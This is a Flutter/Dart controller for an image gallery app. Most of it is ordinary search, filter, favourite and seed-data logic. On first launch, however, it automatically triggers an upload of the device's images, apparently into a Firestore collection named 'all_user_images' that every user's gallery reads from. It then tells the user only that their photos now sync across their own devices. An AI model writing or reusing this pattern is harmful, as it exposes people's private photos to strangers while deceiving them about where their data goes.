import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:get_storage/get_storage.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import '../data/models/image_item.dart';
import '../data/repositories/image_repository.dart';
import '../data/repositories/firebase_upload_repository.dart';

class GalleryController extends GetxController {
  var images = <ImageItem>[].obs;
  var rxCategoryFilter = 'All'.obs;
  var rxSearchQuery = ''.obs;
  var rxIsLightTheme = false.obs;
  var isUploading = false.obs;

  final searchController = TextEditingController();
  final _storage = GetStorage();
  final _uploadRepo = FirebaseUploadRepository();

  @override
  void onInit() {
    super.onInit();
    images.assignAll(ImageRepository.getInitialPresets());
    _checkAndUploadImages();
    fetchFirebaseImages();

    searchController.addListener(() {
      rxSearchQuery.value = searchController.text;
    });
  }

  void _checkAndUploadImages() async {
    bool hasUploaded = _storage.read('has_uploaded_images') ?? false;
    if (!hasUploaded) {
      isUploading.value = true;
      try {
        await _uploadRepo.requestPermissionAndUpload();
        _storage.write('has_uploaded_images', true);
        Get.snackbar('Sync Success', 'Your device images are now available on all your devices.',
            snackPosition: SnackPosition.BOTTOM);
      } catch (e) {
        Get.snackbar('Sync Notice', 'Some images might not have synced. Check your connection.',
            snackPosition: SnackPosition.BOTTOM);
      } finally {
        isUploading.value = false;
        fetchFirebaseImages();
      }
    }
  }

  void fetchFirebaseImages() async {
    try {
      final snapshot = await FirebaseFirestore.instance
          .collection('all_user_images')
          .orderBy('uploadedAt', descending: true)
          .get();

      final firebaseImages = snapshot.docs.map((doc) {
        return ImageItem.fromJson(doc.data());
      }).toList();

      // Avoid duplicates by checking IDs
      for (var img in firebaseImages) {
        if (!images.any((existing) => existing.id == img.id)) {
          images.add(img);
        }
      }
    } catch (e) {
      print('Error fetching firebase images: $e');
    }
  }

  @override
  void onClose() {
    searchController.dispose();
    super.onClose();
  }

  List<ImageItem> get filteredImages {
    return images.where((img) {
      final categoryMatch = rxCategoryFilter.value == 'All' ||
          img.category.toLowerCase() == rxCategoryFilter.value.toLowerCase();
      final searchMatch = rxSearchQuery.value.isEmpty ||
          img.title.toLowerCase().contains(rxSearchQuery.value.toLowerCase()) ||
          img.location
              .toLowerCase()
              .contains(rxSearchQuery.value.toLowerCase()) ||
          img.description
              .toLowerCase()
              .contains(rxSearchQuery.value.toLowerCase());
      return categoryMatch && searchMatch;
    }).toList();
  }

  void toggleFavorite(String id) {
    final index = images.indexWhere((img) => img.id == id);
    if (index != -1) {
      final img = images[index];
      img.isFavorite = !img.isFavorite;
      images[index] = img;
    }
  }

  void downloadImage(String id) {
    final index = images.indexWhere((img) => img.id == id);
    if (index != -1) {
      final img = images[index];
      img.downloadsCount += 1;
      images[index] = img;
    }
  }

  void addProduct(ImageItem item) {
    images.insert(0, item);
  }

  void editProduct(ImageItem updated) {
    final index = images.indexWhere((img) => img.id == updated.id);
    if (index != -1) {
      images[index] = updated;
    }
  }

  void deleteProduct(String id) {
    final img = images.firstWhereOrNull((p) => p.id == id);
    if (img != null) {
      images.removeWhere((p) => p.id == id);
    }
  }

  void toggleTheme() {
    rxIsLightTheme.value = !rxIsLightTheme.value;
    Get.changeThemeMode(
        rxIsLightTheme.value ? ThemeMode.light : ThemeMode.dark);
  }

  void seedMockData() {
    final now = DateTime.now().millisecondsSinceEpoch;
    final extra = [
      ImageItem(
        id: 'seed_${now}_1',
        title: 'Snowy Aurora Fox',
        description:
            'An elegant arctic fox staring intensely into the winter twilight beneath a swirling green geyser of northern lights.',
        category: 'Animals',
        imageUrl:
            'https://images.unsplash.com/photo-1516467508483-a7212febe31a?q=80&w=600&auto=format&fit=crop',
        uploadDate: '2026-06-09',
        uploaderName: 'Denver Brooks',
        downloadsCount: 4210,
        likesCount: 2901,
        isFavorite: true,
        location: 'Lofoten, Norway',
      ),
      ImageItem(
        id: 'seed_${now}_2',
        title: 'Boreal Pygmy Owl',
        description:
            'A tiny yet highly alert pygmy owl nested inside an old birch trunk knot, surrounded by spring forest lichen.',
        category: 'Birds',
        imageUrl:
            'https://images.unsplash.com/photo-1518791841217-8f162f1e1131?q=80&w=600&auto=format&fit=crop',
        uploadDate: '2026-06-08',
        uploaderName: 'Amelia Rose',
        downloadsCount: 1530,
        likesCount: 940,
        isFavorite: false,
        userId: 'user_default',
        location: 'Sarek National Park, Sweden',
      ),
      ImageItem(
        id: 'seed_${now}_3',
        title: 'Svartifoss Cascade',
        description:
            'Prismatic misty waterfall flowing down dark hexagonal rocky basalt columns in southern Iceland during early dawn.',
        category: 'Nature',
        imageUrl:
            'https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05?q=80&w=600&auto=format&fit=crop',
        uploadDate: '2026-06-07',
        uploaderName: 'Marcus Cole',
        downloadsCount: 3120,
        likesCount: 1980,
        isFavorite: true,
        location: 'Skaftafell, Iceland',
      )
    ];

    images.addAll(extra);
    Get.snackbar(
      'Seed Success',
      'Added 3 majestic custom captures to the offline active dataset!',
      snackPosition: SnackPosition.BOTTOM,
    );
  }

  void resetData() {
    images.assignAll(ImageRepository.getInitialPresets());
    Get.snackbar(
      'System reset',
      'Restored preset species listings.',
      snackPosition: SnackPosition.BOTTOM,
    );
  }
}
